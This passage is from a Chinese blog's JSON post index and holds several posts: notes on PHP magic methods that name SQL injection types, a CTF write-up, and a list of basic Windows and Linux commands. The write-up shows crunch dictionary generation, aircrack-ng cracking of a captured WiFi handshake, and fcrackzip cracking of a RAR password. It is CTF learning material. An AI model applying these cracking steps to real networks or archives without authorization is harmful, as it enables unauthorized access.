__toString(), __invoke(), __set_state(), __clone()和debuginfo()等方法在 PHP 中被称为魔术方法（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。 CautionPHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 第五节 sql注入 宽字节注入约束条件注入基于时间盲注","categories":[],"tags":[]},{"title":"test","slug":"test","date":"2019-06-14T16:41:45.000Z","updated":"2019-08-06T10:01:25.814Z","comments":true,"path":"2019/06/15/test/","link":"","permalink":"http://yoursite.com/2019/06/15/test/","excerpt":"","text":"哈哈","categories":[],"tags":[]},{"title":"ctf杂项中 想蹭网先解开密码、隐写2两道writeup","slug":"杂项两道writeup","date":"2019-06-14T09:16:27.000Z","updated":"2019-08-06T11:15:08.844Z","comments":true,"path":"2019/06/14/杂项两道writeup/","link":"","permalink":"http://yoursite.com/2019/06/14/杂项两道writeup/","excerpt":"","text":"##想蹭网先解开密码根据提示，我们只要猜出正确的手机号就能拿到flag并且我们已经知道手机号前七位，只需要猜到后四位使用kali Linux中的工具 crunch 生成密码字典制作1391040开头的11位手机号密码字典 crunch 11 11 0123456789 -t 1391040%%%% -o num11.txt两个11 分别是密码的最小长度和最大长度 num11.txt 是生成的字典名称 利用aircrack-ng破解密码aircrack-ng -w num11.txt wifi.cap 这里num11.txt是爆破用到的密码字典 ##隐写首先用kali中的binwalk分析这个图片，发现有一个rar文件 11 然后用foremost分离，得到一个output文件夹 接着打开路径 output/zip解压里边的zip压缩包，得到如图两个文件 然后再次解压里边的flag.rar，却发现需要密码然后回头看一下另一个，是个图片根据提示的图片，知道密码是三个数字三位的数字密码，继续用crunch生成字典 crunch 3 3 0123456789 -o 3number.txt 之后用kali 自带的fcrackzip工具解密，得到解密密码871。fcrack -D -p 3number.txt -u flag.rar -v-D 就是用的字典模式 -p指定起始破解密码 -u这个参数是为了显示密码用 -v是展示更多信息 输入密码，发现压缩包里还是一张图片 用HXD打开这张图片，在最下边找到信息f1@g{eTB1IEFyZSBhIGhAY2tlciE=} 发现中括号里边的是用base64加密的，然后用ascll及进制转换这个工具，得到y0u Are a h@cker!最后得到flag，f1@g{ y0u Are a h@cker!}","categories":[],"tags":[]},{"title":"最近常用命令行命令","slug":"我的第一篇博客文章","date":"2019-06-08T13:24:29.000Z","updated":"2019-07-19T07:39:49.162Z","comments":true,"path":"2019/06/08/我的第一篇博客文章/","link":"","permalink":"http://yoursite.com/2019/06/08/我的第一篇博客文章/","excerpt":"","text":"##Windows下的命令cd..或者cd .. 返回文件上一层目录cd/ 退回根目录cd ../.. 返回文件上两回目录cd d: 切换到D盘cd / 跳转到根目录cd path 跳转到指定目录cls 清除当前屏幕显示dir 显示当前目录中的子文件夹与文件exit 退出dos命令行 md 创建目录例：md movie 在当前目录中创建名为movie的文件夹例：md d:\\test\\movie 创建d:\\test\\movie目录 rd 删除目录例：rd movie // 删除当前目录下的movie空文件夹例：rd /s /q d:\\test // 使用安静模式删除d:\\test（除目录本身外，还将删除指定目录下的所有子目录和文件） move 移动目录 move 1.png d:\\test\\2.png // 将当前目录下的1.png移动到d盘test文件夹中，并重命名为2.png （若test中也存在同名的png图片，会询问是否覆盖） ##Linux下的命令 tar zxvf 文件名 解压tar.gz 类型文件 unrar e all.rar 解压一个名为all的rar型文件rar a a.png a.rar 将一个名为a的图片压缩为一个名为a的rar文件pwd 查看当前所处目录路径mkdir 文件名 创建一个文件ls 显示当前目录中的子文件夹与文件","categories":[],"tags":[]}]}